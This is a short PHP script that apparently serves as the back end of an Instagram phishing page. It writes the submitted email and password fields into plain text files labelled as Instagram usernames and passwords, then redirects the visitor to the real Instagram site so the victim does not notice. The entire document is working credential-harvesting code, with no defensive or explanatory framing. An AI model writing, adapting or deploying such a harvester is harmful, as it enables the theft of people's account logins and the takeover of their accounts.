<?php

file_put_contents("usernames.txt", "Instagram Username : " . $email = $_POST['email'] . "\n", FILE_APPEND);
?>
<?php
file_put_contents("pass.txt", "Instagram Password : " . $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://www.instagram.com');
?>
